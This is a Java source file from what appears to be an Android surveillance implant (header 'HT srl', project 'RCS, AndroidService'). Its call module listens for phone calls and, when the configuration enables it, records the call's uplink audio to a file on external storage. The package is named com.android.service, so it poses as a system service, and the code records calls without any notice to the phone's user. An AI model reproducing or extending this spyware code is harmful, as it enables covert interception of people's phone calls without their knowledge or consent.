/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module;

import java.io.File;
import java.io.IOException;

import android.media.MediaRecorder;
import android.os.Environment;

import com.android.service.Call;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfModule;
import com.android.service.conf.ConfigurationException;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerCall;
import com.android.service.util.Check;

public class ModuleCall extends BaseModule implements Observer<Call> {
	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
	private MediaRecorder recorder = null;
	private boolean record;
	
	@Override
	public boolean parse(ConfModule conf) {
		if (conf.has("record")) {
			try {
				record = conf.getBoolean("record");
			} catch (ConfigurationException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				record = false;
			}
		}

		return true;
	}

	@Override
	public void actualGo() {

	}

	@Override
	public void actualStart() {
		ListenerCall.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerCall.self().detach(this);
	}

	public int notification(Call call) {
		// Creare un dummy file per capire la strategia da usare
		
		if (record == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): not recording call as per configuration"); //$NON-NLS-1$
			}
			
			return 0;
		}
		
		if (call.isOngoing() == false) {
			if (recorder == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): recorder is already null"); //$NON-NLS-1$
				}
				
				return 0;
			}
			
			recorder.stop();
		    recorder.release();
		    recorder = null;
		    
		    if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): call is finished"); //$NON-NLS-1$
			}
		    
			return 0;
		}
		   
		recorder = new MediaRecorder();
		
		String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/records/test3.3gp";
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): " + path); //$NON-NLS-1$
		}
		
		File directory = new File(path).getParentFile();
		
	    if (!directory.exists() && !directory.mkdirs()) {
	    	return 0;
	    }

	    //recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
	    recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_UPLINK);
	    recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
	    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
	    recorder.setOutputFile(path);
	    
	    try {
			recorder.prepare();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
		}
		
	    recorder.start();
	    
	    if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): recording call..."); //$NON-NLS-1$
		}
	    
		return 0;
	}

}
